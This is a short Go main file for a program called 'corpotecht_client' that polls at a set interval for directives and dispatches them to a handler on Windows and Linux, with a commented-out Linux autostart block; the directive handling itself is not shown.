package main

import (
	"corpotecht_client/config"
	"corpotecht_client/crossplatform"
	"corpotecht_client/utils"
	"runtime"
	"time"
)

func main() {
	os := runtime.GOOS
	ticker := time.NewTicker(config.PingInterval)

	switch os {
	case "windows":
		for ; true; <-ticker.C {
			directive := crossplatform.GetDirective()
			go utils.HandleDirective(directive)
			utils.DebugLog("Ticker Executed")
		}
	case "linux":
		//if !linux.IsServiceInstalled() {
		//	linux.AutoStart()
		//}
		for ; true; <-ticker.C {
			directive := crossplatform.GetDirective()
			go utils.HandleDirective(directive)
			utils.DebugLog("Ticker Executed")
		}
	default:
		println("This OS is not currently supported.")
	}

}
